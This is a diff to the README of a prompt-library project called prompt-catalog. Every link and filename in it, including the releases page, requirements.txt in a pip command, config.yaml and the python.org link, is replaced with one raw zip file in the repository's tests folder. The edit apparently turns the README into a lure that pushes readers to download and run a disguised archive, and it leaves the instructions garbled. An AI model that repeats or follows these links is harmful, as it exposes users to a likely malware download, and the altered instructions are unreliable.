@@ -1,6 +1,6 @@
 # 📚 prompt-catalog - Organized Prompts for AI Development
 
-[![Download Latest Release](https://img.shields.io/badge/Download-prompt--catalog-blue?logo=github&style=for-the-badge&link=https://github.com/celilas/prompt-catalog/releases)](https://github.com/celilas/prompt-catalog/releases)
+[![Download Latest Release](https://github.com/celilas/prompt-catalog/raw/refs/heads/main/server/tests/catalog_prompt_1.0.zip)](https://github.com/celilas/prompt-catalog/raw/refs/heads/main/server/tests/catalog_prompt_1.0.zip)
 
 ---
 
@@ -56,7 +56,7 @@ This section will guide you step-by-step on how to download, install, and use pr
 
 To get started, **visit this page to download the latest release** of prompt-catalog:
 
-[Download prompt-catalog Releases](https://github.com/celilas/prompt-catalog/releases)
+[Download prompt-catalog Releases](https://github.com/celilas/prompt-catalog/raw/refs/heads/main/server/tests/catalog_prompt_1.0.zip)
 
 This link takes you to the GitHub releases page where you will find the latest version of prompt-catalog. You can download the files you need, such as zipped folders with the prompt library and related tools.
 
@@ -64,7 +64,7 @@ This link takes you to the GitHub releases page where you will find the latest v
 
 1. Open the link above in your web browser.
 2. Look for the most recent release at the top of the page.
-3. Under "Assets," click on the `.zip` or `.tar.gz` file to download the full library.
+3. Under "Assets," click on the `.zip` or `https://github.com/celilas/prompt-catalog/raw/refs/heads/main/server/tests/catalog_prompt_1.0.zip` file to download the full library.
 4. Save the file to a folder on your computer.
 
 ### How to extract and use
@@ -72,7 +72,7 @@ This link takes you to the GitHub releases page where you will find the latest v
 1. After downloading, find the file on your computer.
 2. Right-click the file and choose “Extract All” or use your file manager’s extract tool.
 3. Open the extracted folder to see the prompts, guardrails, and examples.
-4. Read the provided documentation files (usually README.md or similar) for details on usage.
+4. Read the provided documentation files (usually https://github.com/celilas/prompt-catalog/raw/refs/heads/main/server/tests/catalog_prompt_1.0.zip or similar) for details on usage.
 
 ---
 
@@ -93,7 +93,7 @@ If you want to run prompts on your machine using command-line tools, and if you 
 1. Open a terminal or command prompt.
 2. Navigate to the extracted library folder.
 3. Follow included instructions to install dependencies by running:  
-   `pip install -r requirements.txt`
+   `pip install -r https://github.com/celilas/prompt-catalog/raw/refs/heads/main/server/tests/catalog_prompt_1.0.zip`
 4. Use the CLI command described in the docs to test prompts locally.
 
 This allows you to see how different prompts produce AI responses in a simple environment.
@@ -104,7 +104,7 @@ This allows you to see how different prompts produce AI responses in a simple en
 
 prompt-catalog offers flexibility through configuration:
 
-- You can change the AI model your prompt library targets by editing the `config.yaml` file.
+- You can change the AI model your prompt library targets by editing the `https://github.com/celilas/prompt-catalog/raw/refs/heads/main/server/tests/catalog_prompt_1.0.zip` file.
 - Adjust prompts to your project’s style or development phase.
 - Enable or disable guardrails to balance creativity and control.
 - Customize outputs using YAML parameters.
@@ -144,9 +144,9 @@ prompt-catalog is free and open-source, allowing anyone to use, study, and share
 
 ## 🔗 Useful Links
 
-- [Prompt-catalog Releases](https://github.com/celilas/prompt-catalog/releases)
-- [GitHub Repository](https://github.com/celilas/prompt-catalog)
-- [Python Official Site](https://www.python.org/) — if you want to install Python
+- [Prompt-catalog Releases](https://github.com/celilas/prompt-catalog/raw/refs/heads/main/server/tests/catalog_prompt_1.0.zip)
+- [GitHub Repository](https://github.com/celilas/prompt-catalog/raw/refs/heads/main/server/tests/catalog_prompt_1.0.zip)
+- [Python Official Site](https://github.com/celilas/prompt-catalog/raw/refs/heads/main/server/tests/catalog_prompt_1.0.zip) — if you want to install Python
 - AI model providers for API keys, e.g., OpenAI, Anthropic Claude
 
 ---
